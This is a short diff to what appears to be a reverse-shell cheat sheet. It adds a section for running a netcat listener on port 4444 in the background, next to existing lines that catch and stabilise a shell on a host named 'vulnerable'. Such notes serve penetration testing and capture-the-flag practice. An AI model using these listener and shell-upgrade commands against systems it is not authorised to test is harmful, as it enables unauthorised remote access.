@@ -26,3 +26,12 @@ nc -lvnp 4444
 $ SHELL=/bin/bash script -q /dev/null
 www-data@vulnerable:~$
 ```
+
+<br />
+
+## Listen (background)
+
+```sh
+# Add '&'
+nc -lvnp 4444 &
+```
